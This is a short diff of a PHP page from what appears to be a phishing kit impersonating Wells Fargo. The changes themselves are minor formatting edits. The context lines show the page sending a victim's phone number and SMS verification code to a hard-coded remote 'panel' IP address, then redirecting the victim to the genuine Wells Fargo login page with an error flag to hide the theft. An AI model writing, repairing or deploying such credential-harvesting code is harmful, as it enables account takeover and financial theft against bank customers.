@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <?php
 session_start();
 error_reporting(0);
@@ -33,6 +32,7 @@ if ($code == "") {
 }
 $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
 ?>
+<!DOCTYPE html>
 <html class="no-js" lang="en">
 <head>
     <meta http-equiv="refresh" content="7; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=mobilebrowser&error=yes">
@@ -74,7 +74,7 @@ $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code"
             </div>
             <div class="logoOuter">
                 <div class="logo">
-                    <a href="#"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg"></a>
+                    <a href="#"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg" style="margin-top: 13px;"></a>
                 </div>
             </div>
             <div id="navRight">
